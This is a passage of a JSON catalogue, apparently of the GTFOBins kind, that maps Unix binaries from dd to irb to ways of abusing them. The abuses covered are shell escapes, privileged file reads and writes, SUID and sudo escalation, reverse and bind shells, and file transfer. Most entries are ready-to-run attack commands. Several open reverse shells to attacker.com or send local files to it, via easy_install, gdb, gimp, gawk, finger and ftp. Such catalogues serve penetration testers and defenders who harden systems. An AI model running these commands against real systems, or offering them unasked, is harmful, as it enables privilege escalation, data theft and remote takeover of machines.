            ]
        },
        "File read": {
            "code": [
                "LFILE=file_to_read",
                "dd if=$LFILE"
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which dd) .",
                "",
                "LFILE=file_to_write",
                "echo \"data\" | ./dd of=$LFILE"
            ]
        },
        "Sudo": {
            "code": [
                "LFILE=file_to_write",
                "echo \"data\" | sudo dd of=$LFILE"
            ]
        }
    },
    "dialog": {
        "File read": {
            "code": [
                "LFILE=file_to_read",
                "dialog --textbox \"$LFILE\" 0 0"
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which dialog) .",
                "",
                "LFILE=file_to_read",
                "./dialog --textbox \"$LFILE\" 0 0"
            ]
        },
        "Sudo": {
            "code": [
                "LFILE=file_to_read",
                "sudo dialog --textbox \"$LFILE\" 0 0"
            ]
        }
    },
    "diff": {
        "File read": {
            "code": [
                "LFILE=file_to_read",
                "diff --line-format=%L /dev/null $LFILE"
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which diff) .",
                "",
                "LFILE=file_to_read",
                "./diff --line-format=%L /dev/null $LFILE"
            ]
        },
        "Sudo": {
            "code": [
                "LFILE=file_to_read",
                "sudo diff --line-format=%L /dev/null $LFILE"
            ]
        }
    },
    "dig": {
        "File read": {
            "code": [
                "LFILE=file_to_read",
                "dig -f $LFILE"
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which dig) .",
                "",
                "LFILE=file_to_read",
                "./dig -f $LFILE"
            ]
        },
        "Sudo": {
            "code": [
                "LFILE=file_to_read",
                "sudo dig -f $LFILE"
            ]
        }
    },
    "dmesg": {
        "Shell": {
            "code": [
                "dmesg -H",
                "!/bin/sh"
            ]
        },
        "File read": {
            "code": [
                "LFILE=file_to_read",
                "dmesg -rF \"$LFILE\""
            ]
        },
        "Sudo": {
            "code": [
                "sudo dmesg -H",
                "!/bin/sh"
            ]
        }
    },
    "dmidecode": {
        "Sudo": {
            "code": [
                "make dmiwrite",
                "TF=$(mktemp)",
                "echo \"DATA\" > $TF",
                "./dmiwrite $TF x.dmi",
                ""
            ]
        }
    },
    "dmsetup": {
        "SUID": {
            "code": [
                "sudo install -m =xs $(which dmsetup) .",
                "",
                "./dmsetup create base <<EOF",
                "0 3534848 linear /dev/loop0 94208",
                "EOF",
                "./dmsetup ls --exec '/bin/sh -p -s'"
            ]
        },
        "Sudo": {
            "code": [
                "sudo dmsetup create base <<EOF",
                "0 3534848 linear /dev/loop0 94208",
                "EOF",
                "sudo dmsetup ls --exec '/bin/sh -s'"
            ]
        }
    },
    "dnf": {
        "Sudo": {
            "code": [
                "TF=$(mktemp -d)",
                "echo 'id' > $TF/x.sh",
                "fpm -n x -s dir -t rpm -a all --before-install $TF/x.sh $TF",
                ""
            ]
        }
    },
    "docker": {
        "Shell": {
            "code": [
                "docker run -v /:/mnt --rm -it alpine chroot /mnt sh"
            ]
        },
        "File write": {
            "code": [
                "CONTAINER_ID=\"$(docker run -d alpine)\" # or existing",
                "TF=$(mktemp)",
                "echo \"DATA\" > $TF",
                "docker cp $TF $CONTAINER_ID:$TF",
                "docker cp $CONTAINER_ID:$TF file_to_write"
            ]
        },
        "File read": {
            "code": [
                "CONTAINER_ID=\"$(docker run -d alpine)\"  # or existing",
                "TF=$(mktemp)",
                "docker cp file_to_read $CONTAINER_ID:$TF",
                "docker cp $CONTAINER_ID:$TF $TF",
                "cat $TF"
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which docker) .",
                "",
                "./docker run -v /:/mnt --rm -it alpine chroot /mnt sh"
            ]
        },
        "Sudo": {
            "code": [
                "sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh"
            ]
        }
    },
    "dosbox": {
        "File write": {
            "code": [
                "LFILE='\\path\\to\\file_to_write'",
                "dosbox -c 'mount c /' -c \"echo DATA >c:$LFILE\" -c exit"
            ]
        },
        "File read": {
            "code": [
                "LFILE='\\path\\to\\file_to_read'",
                "dosbox -c 'mount c /' -c \"type c:$LFILE\""
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which dosbox) .",
                "",
                "LFILE='\\path\\to\\file_to_write'",
                "./dosbox -c 'mount c /' -c \"echo DATA >c:$LFILE\" -c exit"
            ]
        },
        "Sudo": {
            "code": [
                "LFILE='\\path\\to\\file_to_write'",
                "sudo dosbox -c 'mount c /' -c \"echo DATA >c:$LFILE\" -c exit"
            ]
        }
    },
    "dpkg": {
        "Shell": {
            "code": [
                "dpkg -l",
                "!/bin/sh"
            ]
        },
        "Sudo": {
            "code": [
                "sudo dpkg -l",
                "!/bin/sh"
            ]
        }
    },
    "dvips": {
        "Shell": {
            "code": [
                "tex '\\special{psfile=\"`/bin/sh 1>&0\"}\\end'",
                "dvips -R0 texput.dvi"
            ]
        },
        "Sudo": {
            "code": [
                "tex '\\special{psfile=\"`/bin/sh 1>&0\"}\\end'",
                "sudo dvips -R0 texput.dvi"
            ]
        },
        "Limited SUID": {
            "code": [
                "sudo install -m =xs $(which dvips) .",
                "",
                "tex '\\special{psfile=\"`/bin/sh 1>&0\"}\\end'",
                "./dvips -R0 texput.dvi"
            ]
        }
    },
    "easy_install": {
        "Shell": {
            "code": [
                "TF=$(mktemp -d)",
                "echo \"import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')\" > $TF/setup.py",
                "easy_install $TF"
            ]
        },
        "Reverse shell": {
            "code": [
                "export RHOST=attacker.com",
                "export RPORT=12345",
                "TF=$(mktemp -d)",
                "echo 'import sys,socket,os,pty;s=socket.socket()",
                "s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))))",
                "[os.dup2(s.fileno(),fd) for fd in (0,1,2)]",
                "pty.spawn(\"/bin/sh\")' > $TF/setup.py",
                "easy_install $TF"
            ]
        },
        "File upload": {
            "code": [
                "export URL=http://attacker.com/",
                "export LFILE=file_to_send",
                "TF=$(mktemp -d)",
                "echo 'import sys; from os import environ as e",
                "if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u",
                "else: import urllib as u, urllib2 as r",
                "r.urlopen(e[\"URL\"], bytes(u.urlencode({\"d\":open(e[\"LFILE\"]).read()}).encode()))' > $TF/setup.py",
                "easy_install $TF"
            ]
        },
        "File download": {
            "code": [
                "export URL=http://attacker.com/file_to_get",
                "export LFILE=/tmp/file_to_save",
                "TF=$(mktemp -d)",
                "echo \"import os;",
                "os.execl('$(whereis python)', '$(whereis python)', '-c', \\\"\\\"\\\"import sys;",
                "if sys.version_info.major == 3: import urllib.request as r",
                "else: import urllib as r",
                "r.urlretrieve('$URL', '$LFILE')\\\"\\\"\\\")\" > $TF/setup.py",
                "pip install $TF"
            ]
        },
        "File write": {
            "code": [
                "export LFILE=/tmp/file_to_save",
                "TF=$(mktemp -d)",
                "echo \"import os;",
                "os.execl('$(whereis python)', 'python', '-c', 'open(\\\"$LFILE\\\",\\\"w+\\\").write(\\\"DATA\\\")')\" > $TF/setup.py",
                "easy_install $TF"
            ]
        },
        "File read": {
            "code": [
                "TF=$(mktemp -d)",
                "echo 'print(open(\"file_to_read\").read())' > $TF/setup.py",
                "easy_install $TF"
            ]
        },
        "Library load": {
            "code": [
                "TF=$(mktemp -d)",
                "echo 'from ctypes import cdll; cdll.LoadLibrary(\"lib.so\")' > $TF/setup.py",
                "easy_install $TF"
            ]
        },
        "Sudo": {
            "code": [
                "TF=$(mktemp -d)",
                "echo \"import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')\" > $TF/setup.py",
                "sudo easy_install $TF"
            ]
        }
    },
    "eb": {
        "Shell": {
            "code": [
                "eb logs",
                "!/bin/sh"
            ]
        },
        "Sudo": {
            "code": [
                "sudo eb logs",
                "!/bin/sh"
            ]
        }
    },
    "ed": {
        "Shell": {
            "code": [
                "ed",
                "!/bin/sh"
            ]
        },
        "File write": {
            "code": [
                "ed file_to_write",
                "a",
                "DATA",
                ".",
                "w",
                "q"
            ]
        },
        "File read": {
            "code": [
                "ed file_to_read",
                ",p",
                "q"
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which ed) .",
                "",
                "./ed file_to_read",
                ",p",
                "q"
            ]
        },
        "Sudo": {
            "code": [
                "sudo ed",
                "!/bin/sh"
            ]
        },
        "Limited SUID": {
            "code": [
                "sudo install -m =xs $(which ed) .",
                "",
                "./ed",
                "!/bin/sh"
            ]
        }
    },
    "efax": {
        "SUID": {
            "code": [
                "sudo install -m =xs $(which efax) .",
                "",
                "LFILE=file_to_read",
                "./efax -d \"$LFILE\""
            ]
        },
        "Sudo": {
            "code": [
                "LFILE=file_to_read",
                "sudo efax -d \"$LFILE\""
            ]
        }
    },
    "emacs": {
        "Shell": {
            "code": [
                "emacs -Q -nw --eval '(term \"/bin/sh\")'"
            ]
        },
        "File write": {
            "code": [
                "emacs file_to_write",
                "DATA",
                "C-x C-s"
            ]
        },
        "File read": {
            "code": [
                "emacs file_to_read"
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which emacs) .",
                "",
                "./emacs -Q -nw --eval '(term \"/bin/sh -p\")'"
            ]
        },
        "Sudo": {
            "code": [
                "sudo emacs -Q -nw --eval '(term \"/bin/sh\")'"
            ]
        }
    },
    "env": {
        "Shell": {
            "code": [
                "env /bin/sh"
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which env) .",
                "",
                "./env /bin/sh -p"
            ]
        },
        "Sudo": {
            "code": [
                "sudo env /bin/sh"
            ]
        }
    },
    "eqn": {
        "File read": {
            "code": [
                "LFILE=file_to_read",
                "eqn \"$LFILE\""
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which eqn) .",
                "",
                "LFILE=file_to_read",
                "./eqn \"$LFILE\""
            ]
        },
        "Sudo": {
            "code": [
                "LFILE=file_to_read",
                "sudo eqn \"$LFILE\""
            ]
        }
    },
    "ex": {
        "Shell": {
            "code": [
                "ex",
                "!/bin/sh"
            ]
        },
        "File write": {
            "code": [
                "ex file_to_write",
                "a",
                "DATA",
                ".",
                "w",
                "q"
            ]
        },
        "File read": {
            "code": [
                "ex file_to_read",
                ",p",
                "q"
            ]
        },
        "Sudo": {
            "code": [
                "sudo ex",
                "!/bin/sh"
            ]
        }
    },
    "exiftool": {
        "File write": {
            "code": [
                "LFILE=file_to_write",
                "INPUT=input_file",
                "exiftool -filename=$LFILE $INPUT"
            ]
        },
        "File read": {
            "code": [
                "LFILE=file_to_read",
                "OUTPUT=output_file",
                "exiftool -filename=$OUTPUT $LFILE",
                "cat $OUTPUT"
            ]
        },
        "Sudo": {
            "code": [
                "LFILE=file_to_write",
                "INPUT=input_file",
                "sudo exiftool -filename=$LFILE $INPUT"
            ]
        }
    },
    "expand": {
        "File read": {
            "code": [
                "LFILE=file_to_read",
                "expand \"$LFILE\""
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which expand) .",
                "",
                "LFILE=file_to_read",
                "./expand \"$LFILE\""
            ]
        },
        "Sudo": {
            "code": [
                "LFILE=file_to_read",
                "sudo expand \"$LFILE\""
            ]
        }
    },
    "expect": {
        "Shell": {
            "code": [
                "expect -c 'spawn /bin/sh;interact'"
            ]
        },
        "File read": {
            "code": [
                "LFILE=file_to_read",
                "expect $LFILE"
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which expect) .",
                "",
                "./expect -c 'spawn /bin/sh -p;interact'"
            ]
        },
        "Sudo": {
            "code": [
                "sudo expect -c 'spawn /bin/sh;interact'"
            ]
        }
    },
    "facter": {
        "Shell": {
            "code": [
                "TF=$(mktemp -d)",
                "echo 'exec(\"/bin/sh\")' > $TF/x.rb",
                "FACTERLIB=$TF facter"
            ]
        },
        "Sudo": {
            "code": [
                "TF=$(mktemp -d)",
                "echo 'exec(\"/bin/sh\")' > $TF/x.rb",
                "sudo FACTERLIB=$TF facter"
            ]
        }
    },
    "file": {
        "File read": {
            "code": [
                "LFILE=file_to_read",
                "file -f $LFILE"
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which file) .",
                "",
                "LFILE=file_to_read",
                "./file -f $LFILE"
            ]
        },
        "Sudo": {
            "code": [
                "LFILE=file_to_read",
                "sudo file -f $LFILE"
            ]
        }
    },
    "find": {
        "Shell": {
            "code": [
                "find . -exec /bin/sh \\; -quit"
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which find) .",
                "",
                "./find . -exec /bin/sh -p \\; -quit"
            ]
        },
        "Sudo": {
            "code": [
                "sudo find . -exec /bin/sh \\; -quit"
            ]
        }
    },
    "finger": {
        "File upload": {
            "code": [
                "RHOST=attacker.com",
                "LFILE=file_to_send",
                "finger \"$(base64 $LFILE)@$RHOST\""
            ]
        },
        "File download": {
            "code": [
                "RHOST=attacker.com",
                "LFILE=file_to_save",
                "finger x@$RHOST | base64 -d > \"$LFILE\""
            ]
        }
    },
    "fish": {
        "Shell": {
            "code": [
                "fish"
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which fish) .",
                "",
                "./fish"
            ]
        },
        "Sudo": {
            "code": [
                "sudo fish"
            ]
        }
    },
    "flock": {
        "Shell": {
            "code": [
                "flock -u / /bin/sh"
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which flock) .",
                "",
                "./flock -u / /bin/sh -p"
            ]
        },
        "Sudo": {
            "code": [
                "sudo flock -u / /bin/sh"
            ]
        }
    },
    "fmt": {
        "File read": {
            "code": [
                "LFILE=file_to_read",
                "fmt -pNON_EXISTING_PREFIX \"$LFILE\""
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which fmt) .",
                "",
                "LFILE=file_to_read",
                "./fmt -999 \"$LFILE\""
            ]
        },
        "Sudo": {
            "code": [
                "LFILE=file_to_read",
                "sudo fmt -999 \"$LFILE\""
            ]
        }
    },
    "fold": {
        "File read": {
            "code": [
                "LFILE=file_to_read",
                "fold -w99999999 \"$LFILE\""
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which fold) .",
                "",
                "LFILE=file_to_read",
                "./fold -w99999999 \"$LFILE\""
            ]
        },
        "Sudo": {
            "code": [
                "LFILE=file_to_read",
                "sudo fold -w99999999 \"$LFILE\""
            ]
        }
    },
    "ftp": {
        "Shell": {
            "code": [
                "ftp",
                "!/bin/sh"
            ]
        },
        "File upload": {
            "code": [
                "RHOST=attacker.com",
                "ftp $RHOST",
                "put file_to_send"
            ]
        },
        "File download": {
            "code": [
                "RHOST=attacker.com",
                "ftp $RHOST",
                "get file_to_get"
            ]
        },
        "Sudo": {
            "code": [
                "sudo ftp",
                "!/bin/sh"
            ]
        }
    },
    "gawk": {
        "Shell": {
            "code": [
                "gawk 'BEGIN {system(\"/bin/sh\")}'"
            ]
        },
        "Non-interactive reverse shell": {
            "code": [
                "RHOST=attacker.com",
                "RPORT=12345",
                "gawk -v RHOST=$RHOST -v RPORT=$RPORT 'BEGIN {",
                "    s = \"/inet/tcp/0/\" RHOST \"/\" RPORT;",
                "    while (1) {printf \"> \" |& s; if ((s |& getline c) <= 0) break;",
                "    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'"
            ]
        },
        "Non-interactive bind shell": {
            "code": [
                "LPORT=12345",
                "gawk -v LPORT=$LPORT 'BEGIN {",
                "    s = \"/inet/tcp/\" LPORT \"/0/0\";",
                "    while (1) {printf \"> \" |& s; if ((s |& getline c) <= 0) break;",
                "    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'"
            ]
        },
        "File write": {
            "code": [
                "LFILE=file_to_write",
                "gawk -v LFILE=$LFILE 'BEGIN { print \"DATA\" > LFILE }'"
            ]
        },
        "File read": {
            "code": [
                "LFILE=file_to_read",
                "gawk '//' \"$LFILE\""
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which gawk) .",
                "",
                "LFILE=file_to_read",
                "./gawk '//' \"$LFILE\""
            ]
        },
        "Sudo": {
            "code": [
                "sudo gawk 'BEGIN {system(\"/bin/sh\")}'"
            ]
        },
        "Limited SUID": {
            "code": [
                "sudo install -m =xs $(which gawk) .",
                "",
                "./gawk 'BEGIN {system(\"/bin/sh\")}'"
            ]
        }
    },
    "gcc": {
        "Shell": {
            "code": [
                "gcc -wrapper /bin/sh,-s ."
            ]
        },
        "File write": {
            "code": [
                "LFILE=file_to_delete",
                "gcc -xc /dev/null -o $LFILE"
            ]
        },
        "File read": {
            "code": [
                "LFILE=file_to_read",
                "gcc -x c -E \"$LFILE\""
            ]
        },
        "Sudo": {
            "code": [
                "sudo gcc -wrapper /bin/sh,-s ."
            ]
        }
    },
    "gcore": {
        "File read": {
            "code": [
                "gcore $PID"
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which gcore) .",
                "",
                "./gcore $PID"
            ]
        },
        "Sudo": {
            "code": [
                "sudo gcore $PID"
            ]
        }
    },
    "gdb": {
        "Shell": {
            "code": [
                "gdb -nx -ex '!sh' -ex quit"
            ]
        },
        "Reverse shell": {
            "code": [
                "export RHOST=attacker.com",
                "export RPORT=12345",
                "gdb -nx -ex 'python import sys,socket,os,pty;s=socket.socket()",
                "s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))))",
                "[os.dup2(s.fileno(),fd) for fd in (0,1,2)]",
                "pty.spawn(\"/bin/sh\")' -ex quit"
            ]
        },
        "File upload": {
            "code": [
                "export URL=http://attacker.com/",
                "export LFILE=file_to_send",
                "gdb -nx -ex 'python import sys; from os import environ as e",
                "if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u",
                "else: import urllib as u, urllib2 as r",
                "r.urlopen(e[\"URL\"], bytes(u.urlencode({\"d\":open(e[\"LFILE\"]).read()}).encode()))' -ex quit"
            ]
        },
        "File download": {
            "code": [
                "export URL=http://attacker.com/file_to_get",
                "export LFILE=file_to_save",
                "gdb -nx -ex 'python import sys; from os import environ as e",
                "if sys.version_info.major == 3: import urllib.request as r",
                "else: import urllib as r",
                "r.urlretrieve(e[\"URL\"], e[\"LFILE\"])' -ex quit"
            ]
        },
        "File write": {
            "code": [
                "LFILE=file_to_write",
                "gdb -nx -ex \"dump value $LFILE \\\"DATA\\\"\" -ex quit"
            ]
        },
        "File read": {
            "code": [
                "gdb -nx -ex 'python print(open(\"file_to_read\").read())' -ex quit"
            ]
        },
        "Library load": {
            "code": [
                "gdb -nx -ex 'python from ctypes import cdll; cdll.LoadLibrary(\"lib.so\")' -ex quit"
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which gdb) .",
                "",
                "./gdb -nx -ex 'python import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")' -ex quit"
            ]
        },
        "Sudo": {
            "code": [
                "sudo gdb -nx -ex '!sh' -ex quit"
            ]
        },
        "Capabilities": {
            "code": [
                "cp $(which gdb) .",
                "sudo setcap cap_setuid+ep gdb",
                "",
                "./gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit"
            ]
        }
    },
    "gem": {
        "Shell": {
            "code": [
                "gem open -e \"/bin/sh -c /bin/sh\" rdoc"
            ]
        },
        "Sudo": {
            "code": [
                "sudo gem open -e \"/bin/sh -c /bin/sh\" rdoc"
            ]
        }
    },
    "genisoimage": {
        "File read": {
            "code": [
                "LFILE=file_to_read",
                "genisoimage -q -o - \"$LFILE\""
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which genisoimage) .",
                "",
                "LFILE=file_to_read",
                "./genisoimage -sort \"$LFILE\""
            ]
        },
        "Sudo": {
            "code": [
                "LFILE=file_to_read",
                "sudo genisoimage -q -o - \"$LFILE\""
            ]
        }
    },
    "ghc": {
        "Shell": {
            "code": [
                "ghc -e 'System.Process.callCommand \"/bin/sh\"'"
            ]
        },
        "Sudo": {
            "code": [
                "sudo ghc -e 'System.Process.callCommand \"/bin/sh\"'"
            ]
        }
    },
    "ghci": {
        "Shell": {
            "code": [
                "ghci",
                "System.Process.callCommand \"/bin/sh\""
            ]
        },
        "Sudo": {
            "code": [
                "sudo ghci",
                "System.Process.callCommand \"/bin/sh\""
            ]
        }
    },
    "gimp": {
        "Shell": {
            "code": [
                "gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.system(\"sh\")'"
            ]
        },
        "Reverse shell": {
            "code": [
                "export RHOST=attacker.com",
                "export RPORT=12345",
                "gimp -idf --batch-interpreter=python-fu-eval -b 'import sys,socket,os,pty;s=socket.socket()",
                "s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))))",
                "[os.dup2(s.fileno(),fd) for fd in (0,1,2)]",
                "pty.spawn(\"/bin/sh\")'"
            ]
        },
        "File upload": {
            "code": [
                "export URL=http://attacker.com/",
                "export LFILE=file_to_send",
                "gimp -idf --batch-interpreter=python-fu-eval -b 'import sys; from os import environ as e",
                "if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u",
                "else: import urllib as u, urllib2 as r",
                "r.urlopen(e[\"URL\"], bytes(u.urlencode({\"d\":open(e[\"LFILE\"]).read()}).encode()))'"
            ]
        },
        "File download": {
            "code": [
                "export URL=http://attacker.com/file_to_get",
                "export LFILE=file_to_save",
                "gimp -idf --batch-interpreter=python-fu-eval -b 'import sys; from os import environ as e",
                "if sys.version_info.major == 3: import urllib.request as r",
                "else: import urllib as r",
                "r.urlretrieve(e[\"URL\"], e[\"LFILE\"])'"
            ]
        },
        "File write": {
            "code": [
                "gimp -idf --batch-interpreter=python-fu-eval -b 'open(\"file_to_write\", \"wb\").write(\"DATA\")'"
            ]
        },
        "File read": {
            "code": [
                "gimp -idf --batch-interpreter=python-fu-eval -b 'print(open(\"file_to_read\").read())'"
            ]
        },
        "Library load": {
            "code": [
                "gimp -idf --batch-interpreter=python-fu-eval -b 'from ctypes import cdll; cdll.LoadLibrary(\"lib.so\")'"
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which gimp) .",
                "",
                "./gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'"
            ]
        },
        "Sudo": {
            "code": [
                "sudo gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.system(\"sh\")'"
            ]
        }
    },
    "ginsh": {
        "Shell": {
            "code": [
                "ginsh",
                "!/bin/sh"
            ]
        },
        "Sudo": {
            "code": [
                "sudo ginsh",
                "!/bin/sh"
            ]
        },
        "Limited SUID": {
            "code": [
                "sudo install -m =xs $(which ginsh) .",
                "",
                "./ginsh",
                "!/bin/sh"
            ]
        }
    },
    "git": {
        "Shell": {
            "code": [
                "PAGER='sh -c \"exec sh 0<&1\"' git -p help"
            ]
        },
        "File read": {
            "code": [
                "LFILE=file_to_read",
                "git diff /dev/null $LFILE"
            ]
        },
        "Sudo": {
            "code": [
                "sudo PAGER='sh -c \"exec sh 0<&1\"' git -p help"
            ]
        },
        "Limited SUID": {
            "code": [
                "sudo install -m =xs $(which git) .",
                "",
                "PAGER='sh -c \"exec sh 0<&1\"' ./git -p help"
            ]
        }
    },
    "grc": {
        "Shell": {
            "code": [
                "grc --pty /bin/sh"
            ]
        },
        "Sudo": {
            "code": [
                "sudo grc --pty /bin/sh"
            ]
        }
    },
    "grep": {
        "File read": {
            "code": [
                "LFILE=file_to_read",
                "grep '' $LFILE"
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which grep) .",
                "",
                "LFILE=file_to_read",
                "./grep '' $LFILE"
            ]
        },
        "Sudo": {
            "code": [
                "LFILE=file_to_read",
                "sudo grep '' $LFILE"
            ]
        }
    },
    "gtester": {
        "Shell": {
            "code": [
                "TF=$(mktemp)",
                "echo '#!/bin/sh' > $TF",
                "echo 'exec /bin/sh -p 0<&1' >> $TF",
                "chmod +x $TF",
                "gtester -q $TF"
            ]
        },
        "File write": {
            "code": [
                "LFILE=file_to_write",
                "gtester \"DATA\" -o $LFILE"
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which gtester) .",
                "",
                "TF=$(mktemp)",
                "echo '#!/bin/sh -p' > $TF",
                "echo 'exec /bin/sh -p 0<&1' >> $TF",
                "chmod +x $TF",
                "sudo gtester -q $TF"
            ]
        },
        "Sudo": {
            "code": [
                "TF=$(mktemp)",
                "echo '#!/bin/sh' > $TF",
                "echo 'exec /bin/sh 0<&1' >> $TF",
                "chmod +x $TF",
                "sudo gtester -q $TF"
            ]
        }
    },
    "gzip": {
        "File read": {
            "code": [
                "LFILE=file_to_read",
                "gzip -f $LFILE -t"
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which gzip) .",
                "",
                "LFILE=file_to_read",
                "./gzip -f $LFILE -t"
            ]
        },
        "Sudo": {
            "code": [
                "LFILE=file_to_read",
                "sudo gzip -f $LFILE -t"
            ]
        }
    },
    "hd": {
        "File read": {
            "code": [
                "LFILE=file_to_read",
                "hd \"$LFILE\""
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which hd) .",
                "",
                "LFILE=file_to_read",
                "./hd \"$LFILE\""
            ]
        },
        "Sudo": {
            "code": [
                "LFILE=file_to_read",
                "sudo hd \"$LFILE\""
            ]
        }
    },
    "head": {
        "File read": {
            "code": [
                "LFILE=file_to_read",
                "head -c1G \"$LFILE\""
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which head) .",
                "",
                "LFILE=file_to_read",
                "./head -c1G \"$LFILE\""
            ]
        },
        "Sudo": {
            "code": [
                "LFILE=file_to_read",
                "sudo head -c1G \"$LFILE\""
            ]
        }
    },
    "hexdump": {
        "File read": {
            "code": [
                "LFILE=file_to_read",
                "hexdump -C \"$LFILE\""
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which hexdump) .",
                "",
                "LFILE=file_to_read",
                "./hexdump -C \"$LFILE\""
            ]
        },
        "Sudo": {
            "code": [
                "LFILE=file_to_read",
                "sudo hexdump -C \"$LFILE\""
            ]
        }
    },
    "highlight": {
        "File read": {
            "code": [
                "LFILE=file_to_read",
                "highlight --no-doc --failsafe \"$LFILE\""
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which highlight) .",
                "",
                "LFILE=file_to_read",
                "./highlight --no-doc --failsafe \"$LFILE\""
            ]
        },
        "Sudo": {
            "code": [
                "LFILE=file_to_read",
                "sudo highlight --no-doc --failsafe \"$LFILE\""
            ]
        }
    },
    "hping3": {
        "Shell": {
            "code": [
                "hping3",
                "/bin/sh"
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which hping3) .",
                "",
                "./hping3",
                "/bin/sh -p"
            ]
        },
        "Sudo": {
            "code": [
                "sudo hping3",
                "/bin/sh"
            ]
        }
    },
    "iconv": {
        "File write": {
            "code": [
                "LFILE=file_to_write",
                "echo \"DATA\" | iconv -f 8859_1 -t 8859_1 -o \"$LFILE\""
            ]
        },
        "File read": {
            "code": [
                "LFILE=file_to_read",
                "iconv -f 8859_1 -t 8859_1 \"$LFILE\""
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which iconv) .",
                "",
                "LFILE=file_to_read",
                "./iconv -f 8859_1 -t 8859_1 \"$LFILE\""
            ]
        },
        "Sudo": {
            "code": [
                "LFILE=file_to_read",
                "./iconv -f 8859_1 -t 8859_1 \"$LFILE\""
            ]
        }
    },
    "iftop": {
        "Shell": {
            "code": [
                "iftop",
                "!/bin/sh"
            ]
        },
        "Sudo": {
            "code": [
                "sudo iftop",
                "!/bin/sh"
            ]
        },
        "Limited SUID": {
            "code": [
                "sudo install -m =xs $(which iftop) .",
                "",
                "./iftop",
                "!/bin/sh"
            ]
        }
    },
    "install": {
        "SUID": {
            "code": [
                "sudo install -m =xs $(which install) .",
                "",
                "LFILE=file_to_change",
                "TF=$(mktemp)",
                "./install -m 6777 $LFILE $TF"
            ]
        },
        "Sudo": {
            "code": [
                "LFILE=file_to_change",
                "TF=$(mktemp)",
                "sudo install -m 6777 $LFILE $TF"
            ]
        }
    },
    "ionice": {
        "Shell": {
            "code": [
                "ionice /bin/sh"
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which ionice) .",
                "",
                "./ionice /bin/sh -p"
            ]
        },
        "Sudo": {
            "code": [
                "sudo ionice /bin/sh"
            ]
        }
    },
    "ip": {
        "File read": {
            "code": [
                "LFILE=file_to_read",
                "ip -force -batch \"$LFILE\""
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which ip) .",
                "",
                "LFILE=file_to_read",
                "./ip -force -batch \"$LFILE\""
            ]
        },
        "Sudo": {
            "code": [
                "LFILE=file_to_read",
                "sudo ip -force -batch \"$LFILE\""
            ]
        }
    },
    "irb": {
        "Shell": {
            "code": [
                "irb",
                "exec '/bin/bash'"
            ]
        },
        "Reverse shell": {
            "code": [
                "export RHOST='127.0.0.1'",
                "export RPORT=9000",
                "irb",
                "require 'socket'; exit if fork;c=TCPSocket.new(ENV[\"RHOST\"],ENV[\"RPORT\"]);while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read} end"
            ]
        },
        "File upload": {
            "code": [
                "irb",
                "require 'webrick'; WEBrick::HTTPServer.new(:Port => 8888, :DocumentRoot => Dir.pwd).start;"
            ]
        },
        "File download": {
            "code": [
                "export URL=http://attacker.com/file_to_get",
                "export LFILE=file_to_save",
                "irb",
                "require 'open-uri'; download = open(ENV['URL']); IO.copy_stream(download, ENV['LFILE'])"
            ]
        },
        "File write": {
            "code": [
                "irb",
                "File.open(\"file_to_write\", \"w+\") { |f| f.write(\"DATA\") }"
            ]
        },
        "File read": {
            "code": [
                "irb",
                "puts File.read(\"file_to_read\")"
            ]
        },
        "Library load": {
            "code": [
                "irb",
                "require \"fiddle\"; Fiddle.dlopen(\"lib.so\")"
            ]
        },
